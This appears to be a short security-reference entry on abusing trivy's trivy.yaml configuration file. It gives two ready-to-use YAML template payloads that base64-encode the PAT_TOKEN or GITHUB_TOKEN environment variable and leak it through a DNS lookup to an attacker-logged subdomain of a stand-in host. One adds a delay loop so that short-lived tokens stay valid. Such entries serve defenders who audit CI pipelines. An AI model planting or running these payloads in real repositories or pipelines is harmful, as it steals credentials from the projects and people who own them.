---
title: trivy
tags:
- cli
- config-file
references:
- https://trivy.dev/latest/docs/references/configuration/config-file/
files: [trivy.yaml]
---

`trivy` can be configured via `trivy.yaml` file in the current directory.

## Environment variable exfiltration

An attacker can exfiltrate environment variables using the support for go
templates and [sprig](https://masterminds.github.io/sprig/) functions. An
attacker needs a DNS server with logging to retrieve the subdomain as the payload.

{% raw %}

```yaml
template: "{{ $test := ( printf \"%s.example.com\" ( b64enc ( env \"PAT_TOKEN\" ) ) ) }} {{ getHostByName $test }}"
format: "template"
```

{% endraw %}

For ephemeral tokens, waiting can be added through a loop after the exfiltration.

{% raw %}

```yaml
template: "{{ $test := ( printf \"%s.example.com\" ( b64enc ( env \"GITHUB_TOKEN\" ) ) ) }} {{ getHostByName $test }} {{ range 6500000 }} {{ end }}"
format: "template"
```

{% endraw %}
